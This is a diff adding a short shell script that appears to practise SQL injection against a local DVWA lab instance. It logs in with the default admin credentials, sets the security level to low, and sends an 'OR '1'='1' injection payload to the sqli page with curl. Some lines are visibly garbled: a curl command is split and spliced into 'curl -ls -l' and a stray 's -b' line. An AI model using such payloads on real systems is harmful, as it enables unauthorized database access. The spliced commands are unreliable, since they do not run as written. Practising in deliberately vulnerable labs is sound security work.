@@ -1,0 +1,24 @@
+# show cookie file and PHPSESSID (you created this earlier)
+pwd
+ls -l cookies.txt
+grep -i PHPSESSID cookies.txt || cat cookies.txt
+
+# check the SQLi page status using that cookie
+curl -s -I -b cookies.txt "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" | sed -n '1,8p'
+
+curl -ls -l /tmp/sqli_test.html
+head -n 60 /tmp/sqli_test.html
+s -b cookies.txt "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27=%271&Submit=Submit" -o /tmp/sqli_test.html
+
+ls -l /tmp/sqli_test.html
+head -n 60 /tmp/sqli_test.html
+
+firefox /tmp/sqli_test.html & disown
+
+xdg-open /tmp/sqli_test.html 2>/dev/null || echo "Saved /tmp/sqli_test.html — open it in the VM browser"
+
+
+curl -s -c cookies.txt -d "username=admin&password=password&Login=Login" "http://127.0.0.1/dvwa/login.php" > /dev/null
+curl -s -b cookies.txt -c cookies.txt -d "security=low&seclev_submit=Submit" "http://127.0.0.1/dvwa/security.php" > /dev/null
+
+curl -s -I -b cookies.txt "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27=%271&Submit=Submit" | sed -n '1,20p'
